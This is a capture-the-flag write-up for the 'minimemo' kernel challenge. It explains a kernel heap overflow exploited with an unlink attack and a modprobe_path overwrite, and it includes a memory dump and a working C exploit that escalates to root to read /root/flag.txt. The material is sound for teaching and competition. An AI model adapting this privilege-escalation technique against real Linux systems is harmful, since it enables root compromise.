# minimemo
I solved kernel exploit challenge for the first time.  
I'm so glad, thanks to author @ptrYudai.  
He always give us good tasks.  

## TLDR
### Vulnerability
* buffer overflow on kernel heap
### How to attack
* unlink attack
* overwrite modprobe\_path

## Challenge
### Description
Linux kernel security function
* KASLR  : Enable
* KPTI   : Disable
* SMEP   : Disable
* SMAP   : Disable

Linux 5.14.3
### Exploit 
I solved this challenges with brute force attack(3bit + a).  
So my solution was not smart.  

We can overwrite "fd" member of struct notelist\_t, but with value of "id" member.  
When the most lowest bytes of "id" is proper, we cana link user land data to linked list, because SMAP is disable.  
If it can be, we can get the address of the kernel heap address and the kernel module addresss, and do AAW via user land data.  
But we cannot get the kernel base address.  

See around the kernel module address, there are some addresses which based on the kernel base address.  
* memory dump around global variable top(kernel module address = 0xffffffffc006b000)
```
wndbg> x/20gx 0xffffffffc006b000+0x2100
0xffffffffc006d100:     0x0000000000000000      0x0000000000000000
0xffffffffc006d110:     0x0000000000000000      0xffffffffc006d100  <- top.fd
0xffffffffc006d120:     0xffffffffc006d100      0x0000000000000000  <--- top.bk
0xffffffffc006d130:     0x0000000000000000      0x0000000000000000
0xffffffffc006d140:     0x0000000000000000      0xffffffffb72a9e80  <- kernel base address + ????
0xffffffffc006d150:     0xffffffffb72a9e80      0x6f6d656d696e696d  <--- kernel base address + ????
0xffffffffc006d160:     0x0000000000000000      0x0000000000000000
0xffffffffc006d170:     0x0000000000000000      0x0000000000000000
0xffffffffc006d180:     0x0000000000000000      0x0000000000000000
0xffffffffc006d190:     0xffff922e81339600      0xffff922e811191e0
```

I overwrote the lowest 3 bytes of these address with offset of modprobe\_path. To success this attack, we need to conqure 3bit brute force(It is caused by KASLR).  

A part of exploit
```c
int dev_fd;

long create() 
{
	long id;
	request_t req;
	id = ioctl(dev_fd, CMD_NEW, &req);
	if(id < 0)
		err_exit("[!] ERROR CMD_NEW\n");
	printf("[+] CMD_NEW: id = 0x%lx\n", id);
	return id;
}

void edit(request_t* req)
{
	long ret;
	ret = ioctl(dev_fd, CMD_EDIT, req);
	if(ret < 0)
		err_exit("[!] ERROR CMD_EDIT\n");
	printf("[-] CMD_EDIT DONE\n");
	return;
}

void delete(int id)
{
	long ret;
	request_t req;
	req.id = id;

	ret = ioctl(dev_fd, CMD_DEL, &req);
	if(ret < 0)
		err_exit("[!] ERROR CMD_DEL\n");
	printf("[-] CMD_DEL DONE\n");
	return;
}

int idlist[0x100] = {0};
int off_list = 0;
int top = 0;

long addr_module;
long addr_heap;
long addr_kernel;
long kernel_base;

int main(){
	request_t req;
	notelist_t notelist;
	notelist_t notelist_sub;
	int id, i ;
	int offset = -1;
	int padding;
	dev_fd = open("/dev/memo", O_RDWR);
	if(dev_fd < 0)
		err_exit("open error");

	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/badbin");
	system("echo -ne '#!/bin/sh\nchmod 777 /root/flag.txt && cp /root/flag.txt /tmp/flag' > /tmp/km2.sh");
	system("chmod +x /tmp/km2.sh /tmp/badbin");
	puts("[+] START");
	
	memset(&notelist, 0, sizeof(notelist_t));
	memset(req.data, 0x41, 20);
	req.size = 20;

	for(i = 0; i < 5; i++){
		id = create();
		req.id = id;
		edit(&req);
		idlist[off_list] = id;
		off_list++;
	}
	
	while(1) {
		id = create();
		req.id = id;
		edit(&req);
		idlist[off_list] = id;
		off_list++;
		//id = (id & 0x3f);
		//if(id >= 0x8 && id <= 0x14) {
		id = (id & 0xff);
		if(id >= 0xc8 && id <= 0xd4) {
			offset = off_list-1;
			break;
		}
	}

	for(i = 0;i < 5; i++){
		id = create();
		req.id = id;
		edit(&req);
		idlist[off_list] = id;
		off_list++;
	}

	req.id = idlist[offset];
	req.size = 21;
	edit(&req);

	req.id = 0x41414141;
	padding = (0x14-(idlist[offset] & 0x3f));
	req.size = 8+padding;
	memset(req.data, 0x41, padding);
	*((long*)&req.data[padding]) = &notelist;
	edit(&req);

	
	while(notelist.bk == 0){
		delete(idlist[--off_list]);	
	}
	addr_module = notelist.bk;	
	printf("[+] top = %lx\n", (long)notelist.bk);
	id = create();
	addr_heap = notelist.bk;
	printf("[+] heap = %lx\n", (long)notelist.bk);
	
	notelist.note.id = 0x42424242;
	notelist.fd = addr_module+0x44;
	
	req.size = 3;
	req.id = 0;
	*((long*)req.data) = 0x8367c0-4; // 3bit brute force
	
	edit(&req);
	
	notelist.fd = addr_module+0x2c;
	req.size = 4;
	req.id = 0;
	*((long*)req.data) = 0x43434343;
	
	edit(&req);
	  
	notelist.fd = addr_module+0x30;
	req.size = 12;
	req.id = 0;
	strcpy(req.data, "/tmp/km2.sh\x00");
	edit(&req);
	
	puts("[+] END");
	system("/tmp/badbin");
	
	return 0;
}
```

My exploit code is [k\_exp.py](https://github.com/kam1tsur3/2021_CTF/blob/master/asis/pwn/minimemo/exploit/k_exp.c).

## Reference

twitter: @kam1tsur3
